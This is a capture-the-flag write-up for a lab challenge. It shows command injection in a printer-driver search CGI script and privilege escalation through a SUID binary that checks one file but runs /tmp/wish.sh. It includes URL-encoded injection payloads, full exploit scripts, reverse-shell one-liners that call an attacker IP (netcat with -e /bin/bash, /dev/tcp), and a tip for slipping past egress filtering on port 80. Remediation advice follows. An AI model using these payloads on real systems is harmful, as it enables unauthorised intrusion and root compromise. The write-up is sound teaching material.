# Phasing Through Printers - CTF Challenge Writeup

## Challenge Information
- **Name:** Phasing Through Printers
- **Category:** Web Exploitation / Privilege Escalation
- **Difficulty:** Medium
- **Objective:** Exploit command injection vulnerability and escalate privileges to read `/root/flag.txt`

## Initial Reconnaissance

The challenge presents a web application with a "Printer Driver Search" interface. We were provided with the source code for a CGI script (`search.c`).

### Analyzing the Source Code

The vulnerable code in `search.c`:

```c
char first_part[] = "grep -R -i ";
char last_part[] = " /var/www/html/data/printer_drivers.txt";
size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
char *combinedString = (char *)malloc(totalLength);
strcpy(combinedString, first_part);
strcat(combinedString, decoded);
strcat(combinedString, last_part);

fp = popen(combinedString, "r");
```

**Key Vulnerability:** User input is directly concatenated into a shell command executed via `popen()` without any sanitization.

## Exploitation Phase 1: Command Injection

### Setting Up Authentication

The challenge required authentication via a token cookie:

```bash
TOKEN="11b2e7db-c1d1-4896-8c58-5e13b7bcb505_1_6ebd587a7aed715ffc144570bd5cf82ca931809c3f8e8136d0ad3261856a343b"
```

### Testing Command Injection

The constructed command looked like:
```
grep -R -i [USER_INPUT] /var/www/html/data/printer_drivers.txt
```

We can inject commands using `;` to terminate grep and `#` to comment out the rest:

```bash
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bwhoami%3B%23"
```

Where:
- `%3B` = `;` (semicolon)
- `%23` = `#` (hash/comment)

### Verifying Command Execution

Testing file write capability:

```bash
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=test%3Becho%20WORKING%20%3E%20%2Fvar%2Fwww%2Fhtml%2Ftest.txt%3B%23"

curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/test.txt"
# Output: WORKING /var/www/html/data/printer_drivers.txt
```

âœ… Command injection confirmed!

## Enumeration

### Finding SUID Binaries

Using command injection to enumerate:

```bash
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bfind%20%2F%20-perm%20-4000%20-type%20f%202%3E%2Fdev%2Fnull%3B%23"
```

**Results:**
```
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help    <-- Custom SUID binary!
```

ðŸŽ¯ **Key Finding:** `/usr/local/bin/admin_help` - Custom SUID binary owned by root!

### Finding the Flag Location

```bash
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bfind%20%2F%20-name%20flag.txt%202%3E%2Fdev%2Fnull%3B%23"
```

**Results:**
- `/var/www/html/flag.txt` (decoy - 0 bytes, empty file)
- Real flag location: `/root/flag.txt`

### Environment Details

```bash
# Check for sudo
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bsudo%20-l%202%3E%261%3B%23"
# Result: sh: 1: sudo: not found

# Check environment
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bls%20-la%20%2F%3B%23"
# Found .dockerenv - running in Docker container

# Check current user
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bid%3B%23"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Summary:**
- Running as: `www-data` (uid=33)
- Docker container environment
- No sudo installed
- Cannot directly read `/root/flag.txt`

## Downloading and Analyzing the SUID Binary

This is a critical step - we need to analyze the custom SUID binary to understand how to exploit it.

### Step 1: Copy Binary to Web-Accessible Directory

```bash
# Use command injection to copy admin_help to web root
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bcp%20%2Fusr%2Flocal%2Fbin%2Fadmin_help%20%2Fvar%2Fwww%2Fhtml%2Fadmin_help%3B%23"
```

### Step 2: Download Binary to Kali

```bash
# Download the binary
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/admin_help" -o admin_help

# Verify download
ls -la admin_help
# -rw-r--r-- 1 bwallace bwallace 16416 Oct 15 09:26 admin_help

# Make it executable for local testing
chmod +x admin_help
```

### Step 3: Analyze with strings

```bash
strings admin_help
```

**Key Findings:**
```
/tmp/wisUSH
wish.sh
Error opening original file
Bad String in File.
Your wish is my command... maybe :)
chmod +x /tmp/wish.sh && /tmp/wish.sh
```

These strings reveal:
- Binary works with `/tmp/wish.sh`
- There's a validation mechanism ("Bad String in File")
- It executes: `chmod +x /tmp/wish.sh && /tmp/wish.sh`

### Step 4: Dynamic Analysis with ltrace

```bash
# Create a test file
echo "hello" > testfile.txt

# Run with ltrace to see library calls
ltrace ./admin_help testfile.txt 2>&1
```

**Output:**
```
geteuid()                                         = 1001
setuid(1001)                                      = 0
puts("Your wish is my command... maybe :)")       = 36
fopen("/tmp/wish.sh", "r")                        = nil
perror("Error opening original file")             = <void>
puts("Bad String in File.")                       = 20
+++ exited (status 0) +++
```

**Critical Discovery:** 
1. Binary calls `geteuid()` and `setuid()` to elevate privileges
2. **Opens `/tmp/wish.sh` for reading** (expects it to already exist!)
3. Validates the input file for "bad strings" using `strstr()`
4. If validation passes, executes: `chmod +x /tmp/wish.sh && /tmp/wish.sh`

### Step 5: Understanding the Logic Flaw

The binary has a **critical logic flaw**:
- It validates the file you provide as an argument
- But it executes a completely different file: `/tmp/wish.sh`

**Exploitation Strategy:**
1. Create `/tmp/wish.sh` with our malicious commands (this is NOT validated)
2. Create a separate "clean" file that passes validation
3. Pass the clean file to `admin_help`
4. The binary executes our malicious `/tmp/wish.sh` as root!

## Two Approaches to Solve the Challenge

### Approach A: Using Command Injection Only (No Reverse Shell)

This method works entirely through command injection without needing an interactive shell.

#### Step 1: Create Malicious Script

```bash
# Create /tmp/wish.sh with command to copy flag to web directory
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Becho%20%22dd%20if%3D%2Froot%2Fflag.txt%20of%3D%2Fvar%2Fwww%2Fhtml%2Ff.txt%22%20%3E%20%2Ftmp%2Fwish.sh%3B%23"
```

#### Step 2: Trigger SUID Execution

```bash
# Create clean validation file and run admin_help
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Becho%20%22ok%22%20%3E%20%2Ftmp%2Fvalid%3B%2Fusr%2Flocal%2Fbin%2Fadmin_help%20%2Ftmp%2Fvalid%3B%23"
```

#### Step 3: Retrieve the Flag

```bash
# Read the copied flag file
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/f.txt"
```

**Pros:**
- Works without needing a reverse shell
- Good for restrictive environments
- Can be automated in a script

**Cons:**
- Blind execution - harder to debug
- Less interactive
- Need to exfiltrate data via web directory

---

### Approach B: Using Reverse Shell (Recommended)

This method is cleaner and gives you an interactive shell for easier enumeration and exploitation.

#### Understanding Docker Network Restrictions

The container only allows **outbound connections on ports 80 and 443**. Standard reverse shell ports (4444, 4445, etc.) are blocked by egress filtering.

#### Step 1: Set Up Listener on Port 80

```bash
# On Kali, start netcat listener on port 80
nc -lnvp 80
```

**Note:** You may need to use `sudo` if port 80 requires elevated privileges:
```bash
sudo nc -lnvp 80
```

#### Step 2: Trigger Reverse Shell

```bash
# Inject reverse shell command
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/cgi-bin/search.cgi?q=x%3Bnc%20192.168.41.128%2080%20-e%20%2Fbin%2Fbash%3B%23"
```

**URL decoded:** `;nc 192.168.41.128 80 -e /bin/bash;#`

Where:
- `192.168.41.128` = Your Kali IP address
- `80` = Port 80 (allowed by egress filtering)
- `-e /bin/bash` = Execute bash on connection

#### Step 3: Upgrade the Shell

Once you get the reverse shell:

```bash
# Spawn a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell with Ctrl+Z, then:
# (On Kali)
stty raw -echo; fg

# (Back in reverse shell)
export TERM=xterm
export SHELL=/bin/bash
```

ðŸŽ¯ **Interactive shell obtained as www-data!**

#### Step 4: Enumerate from Shell

```bash
# Check current user
id
whoami

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find flag
find / -name flag.txt 2>/dev/null

# Check admin_help permissions
ls -la /usr/local/bin/admin_help
# -rwsr-xr-x 1 root root 16416 Sep 29 13:09 /usr/local/bin/admin_help
```

#### Step 5: Exploit SUID Binary

```bash
# Create malicious script
echo "dd if=/root/flag.txt of=/var/www/html/f.txt" > /tmp/wish.sh

# Create clean validation file
echo "ok" > /tmp/valid

# Execute with SUID binary (runs as root!)
/usr/local/bin/admin_help /tmp/valid
```

#### Step 6: Read the Flag

```bash
# From the shell
cat /var/www/html/f.txt

# Or from Kali
curl -b "token=$TOKEN" "https://11b2e7db.proxy.coursestack.com/f.txt"
```

**Pros:**
- Interactive shell for easier enumeration
- Can troubleshoot issues in real-time
- Better for learning and understanding
- Can use tab completion and shell features

**Cons:**
- Requires understanding of network restrictions
- Need to find allowed outbound ports

---

## Why Standard Reverse Shells Failed

### âŒ What Didn't Work

```bash
# Listening on port 4444
nc -lnvp 4444  # This won't work - port blocked by egress filtering!

# Trying various reverse shell payloads on blocked ports
bash -c 'bash -i >& /dev/tcp/192.168.41.128/4444 0>&1'  # Blocked!
python3 -c 'import socket...[reverse shell]...'         # Blocked!
```

**Problem:** Docker container has egress filtering that only allows outbound connections on ports 80 and 443.

### âœ… What Worked

```bash
# Listener on allowed port
nc -lnvp 80  # HTTP port - usually allowed

# Simple netcat reverse shell
;nc 192.168.41.128 80 -e /bin/bash;#
```

**Solution:** Use ports that are typically whitelisted for HTTP/HTTPS traffic (80, 443).

---

## Complete Exploit Comparison

### Method A: Command Injection Only
```bash
#!/bin/bash
TOKEN="your-token-here"
TARGET="https://11b2e7db.proxy.coursestack.com"

echo "[*] Creating malicious wish.sh..."
curl -b "token=$TOKEN" "${TARGET}/cgi-bin/search.cgi?q=x%3Becho%20%22dd%20if%3D%2Froot%2Fflag.txt%20of%3D%2Fvar%2Fwww%2Fhtml%2Ff.txt%22%20%3E%20%2Ftmp%2Fwish.sh%3B%23"

echo "[*] Triggering SUID binary..."
curl -b "token=$TOKEN" "${TARGET}/cgi-bin/search.cgi?q=x%3Becho%20%22ok%22%20%3E%20%2Ftmp%2Fvalid%3B%2Fusr%2Flocal%2Fbin%2Fadmin_help%20%2Ftmp%2Fvalid%3B%23"

echo "[*] Retrieving flag..."
curl -b "token=$TOKEN" "${TARGET}/f.txt"
```

### Method B: Reverse Shell
```bash
#!/bin/bash
TOKEN="your-token-here"
TARGET="https://11b2e7db.proxy.coursestack.com"
ATTACKER_IP="192.168.41.128"

echo "[*] Make sure to run: nc -lnvp 80"
echo "[*] Triggering reverse shell on port 80..."
curl -b "token=$TOKEN" "${TARGET}/cgi-bin/search.cgi?q=x%3Bnc%20${ATTACKER_IP}%2080%20-e%20%2Fbin%2Fbash%3B%23"

# After getting shell, run:
# echo "dd if=/root/flag.txt of=/var/www/html/f.txt" > /tmp/wish.sh
# echo "ok" > /tmp/valid
# /usr/local/bin/admin_help /tmp/valid
# cat /var/www/html/f.txt
```

## Key Lessons Learned

1. **Port Restrictions Matter:** Always check which ports are allowed for outbound connections
   - Standard ports: 4444, 4445 â†’ Often blocked
   - HTTP/HTTPS ports: 80, 443 â†’ Usually allowed
   - **Solution:** Use `nc -lnvp 80` instead of standard 4444

2. **Binary Analysis is Critical:** 
   - Download custom SUID binaries to analyze locally
   - Use `strings`, `ltrace`, `strace` to understand behavior
   - Look for logic flaws in execution flow

3. **Command Injection Techniques:**
   - Use `;` to terminate commands
   - Use `#` to comment out remaining parts
   - Test with simple commands first (`whoami`, `id`)

4. **SUID Binary Logic Flaws:** 
   - The admin_help binary validated one file but executed another
   - Always check what file is actually being executed vs validated

5. **Multiple Approaches:** 
   - Command injection only: Good for automation
   - Reverse shell: Better for interactive enumeration
   - Choose based on environment restrictions

6. **Enumeration Techniques:**
   - Find SUID binaries: `find / -perm -4000 2>/dev/null`
   - Locate flags: `find / -name flag.txt 2>/dev/null`
   - Check environment: Look for `.dockerenv`, check `id`, `sudo -l`

## Common Pitfalls & Solutions

### âŒ Mistake: Using Standard Reverse Shell Ports
```bash
nc -lnvp 4444  # Blocked by egress filtering
```

### âœ… Solution: Use Allowed Ports
```bash
nc -lnvp 80    # HTTP port - usually allowed
nc -lnvp 443   # HTTPS port - also works
```

### âŒ Mistake: Complex Reverse Shell Payloads
```bash
# Overly complex payloads that might fail
python3 -c 'import socket,subprocess,os;s=socket.socket...'
bash -c 'bash -i >& /dev/tcp/192.168.41.128/4444 0>&1'
```

### âœ… Solution: Simple Netcat
```bash
# Clean and simple
nc 192.168.41.128 80 -e /bin/bash
```

### âŒ Mistake: Not Analyzing the SUID Binary
```bash
# Trying to pass commands directly to admin_help
/usr/local/bin/admin_help "cat /root/flag.txt"  # Doesn't work!
```

### âœ… Solution: Understand the Logic Flaw
```bash
# Create /tmp/wish.sh separately, validate with dummy file
echo "cat /root/flag.txt" > /tmp/wish.sh
echo "ok" > /tmp/valid
/usr/local/bin/admin_help /tmp/valid  # Executes wish.sh as root!
```

### âŒ Mistake: Not Downloading Binaries for Analysis
```bash
# Trying to guess how the binary works
```

### âœ… Solution: Copy to Web Directory and Download
```bash
# Copy to web-accessible location
cp /usr/local/bin/admin_help /var/www/html/admin_help

# Download to Kali
curl -o admin_help https://target.com/admin_help

# Analyze locally
strings admin_help
ltrace ./admin_help testfile.txt
```

## Vulnerability Chain

1. **Command Injection** in CGI script â†’ Initial foothold as www-data
2. **Discovery of Custom SUID Binary** â†’ Download and analyze admin_help
3. **Docker Network Restrictions** â†’ Use ports 80/443 for reverse shell
4. **SUID Binary Logic Flaw** â†’ Exploit validation vs execution mismatch
5. **Privilege Escalation** â†’ Execute arbitrary commands as root
6. **Flag Capture** â†’ Read `/root/flag.txt`

## Remediation

### For the Web Application:
```c
// BAD - Current implementation
fp = popen(combinedString, "r");

// GOOD - Use safer alternatives
// 1. Whitelist allowed search terms
// 2. Use parameterized queries
// 3. Avoid shell execution entirely
// 4. Use execve() with argument arrays instead of popen()

// Example of safer implementation:
char *allowed_terms[] = {"HP", "Canon", "Epson", NULL};
if (validate_input(decoded, allowed_terms)) {
    // Use grep safely without shell
    char *args[] = {"grep", "-R", "-i", decoded, 
                    "/var/www/html/data/printer_drivers.txt", NULL};
    execv("/usr/bin/grep", args);
}
```

### For the SUID Binary:
```c
// BAD - Current logic flaw
// 1. Read and validate input file
// 2. Execute /tmp/wish.sh (different file!)

// GOOD - Fix the logic flaw
// 1. Read and validate input file
// 2. Copy validated file to /tmp/wish.sh
// 3. Then execute /tmp/wish.sh

// Better approach:
int validate_and_copy(const char *input_file) {
    // Validate input file for bad strings
    if (!validate_strings(input_file)) {
        return -1;
    }
    
    // Copy validated file to wish.sh
    copy_file(input_file, "/tmp/wish.sh");
    
    // Now execute the validated content
    setuid(0);
    system("chmod +x /tmp/wish.sh && /tmp/wish.sh");
    return 0;
}
```

### For Docker Network Security:
```bash
# Implement proper egress filtering
# But remember legitimate services need HTTP/HTTPS
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp -j DROP  # Block other ports

# Monitor outbound connections
# Alert on suspicious netcat usage
```

## Tools Used
- **nc (netcat)** - Reverse shell listener and connection
- **curl** - HTTP requests, file downloads, command injection
- **strings** - Binary analysis to extract readable strings
- **ltrace** - Library call tracing for dynamic analysis
- **find** - File and permission enumeration
- **file** - File type identification
- **chmod** - Make downloaded binary executable
- **cp** - Copy files to web-accessible directories

## Timeline

### Method A (Command Injection Only):
- Initial command injection discovery: ~5 minutes
- Finding SUID binary: ~5 minutes
- Downloading and analyzing binary: ~30 minutes
- Understanding logic flaw: ~20 minutes
- Crafting exploit: ~5 minutes
- **Total:** ~65 minutes

### Method B (With Reverse Shell):
- Initial command injection discovery: ~5 minutes
- Getting reverse shell (trying different ports): ~10 minutes
- Finding SUID binary from shell: ~2 minutes
- Downloading and analyzing binary: ~30 minutes
- Understanding logic flaw: ~15 minutes
- Exploiting from shell: ~2 minutes
- **Total:** ~64 minutes

**Fastest Path with Knowledge:** ~10 minutes
(If you know to use port 80 and understand SUID binary logic flaws)

---

## Quick Reference Card

### Command Injection Syntax
```bash
# Basic format
;COMMAND;#

# URL encoded
%3BCOMMAND%3B%23

# Example
;whoami;#  â†’  %3Bwhoami%3B%23
```

### Reverse Shell (Port 80)
```bash
# Listener (Kali)
nc -lnvp 80

# Payload (URL encoded)
%3Bnc%20192.168.41.128%2080%20-e%20%2Fbin%2Fbash%3B%23

# Decoded
;nc 192.168.41.128 80 -e /bin/bash;#
```

### Download SUID Binary
```bash
# Copy to web directory via command injection
;cp /usr/local/bin/admin_help /var/www/html/admin_help;#

# Download from Kali
curl -b "token=$TOKEN" https://target.com/admin_help -o admin_help

# Analyze
strings admin_help
ltrace ./admin_help testfile.txt
```

### Privilege Escalation (SUID)
```bash
# Create malicious script
echo "dd if=/root/flag.txt of=/var/www/html/f.txt" > /tmp/wish.sh

# Create dummy validation file
echo "ok" > /tmp/valid

# Execute (runs wish.sh as root!)
/usr/local/bin/admin_help /tmp/valid
```

### Key Insight
**The admin_help binary validates one file but executes /tmp/wish.sh** - this is the critical logic flaw that enables privilege escalation!

---

**Author:** bwallace  
**Date:** October 15, 2025  
**Challenge:** Phasing Through Printers  
**Category:** Web Exploitation â†’ Privilege Escalation  
**Special Thanks:** Discord community (shayden) for the port 80 reverse shell hint